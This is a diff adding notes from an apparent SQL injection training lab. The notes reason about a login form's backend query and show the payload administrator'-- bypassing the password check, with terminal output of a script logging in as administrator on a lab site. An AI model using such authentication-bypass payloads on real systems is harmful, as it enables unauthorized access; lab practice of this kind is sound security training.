@@ -1,0 +1,41 @@
+SQL injection - login functionality
+
+End goal: perform SQLi attack and log in as the administrator
+
+Analysis
+--------
+
+Attempt username "admin" password "admin"
+"Invalid username or password" (non-verbose / generic error message)
+
+Format of the SQL query in the backend would probably be something like this:
+SELECT firstName FROM users WHERE username='admin' and password='admin'
+
+Try a query that displays admin login but ignores the password field
+SELECT firstName FROM users WHERE username='admin'--' and password='admin'
+SELECT firstName FROM users WHERE username='admin'
+Does not work because the user "admin" doesn't exist
+
+Try username "administrator" instead
+administrator'--
+This works
+
+====================================================================================
+Format of command to run the script
+
+script.py <url> <sql-payload>
+
+Output:
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-02]
+└─$ python3 sqli-lab-02.py
+[-] Usage: sqli-lab-02.py <url> <sql-payload>
+[-] Example: sqli-lab-02.py www.example.com "1=1"
+                                                                                                                                                                                                   
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-02]
+└─$ python3 sqli-lab-02.py "https://0a6f004f04af2dbe81a78a5500e000c8.web-security-academy.net/login" "admin"           
+[-] SQL injection failed! We have not logged in as the administrator
+                                                                                                                                                                                                   
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-02]
+└─$ python3 sqli-lab-02.py "https://0a6f004f04af2dbe81a78a5500e000c8.web-security-academy.net/login" "administrator'--"
+[+] SQL injection successful! We have logged in as the administrator
+
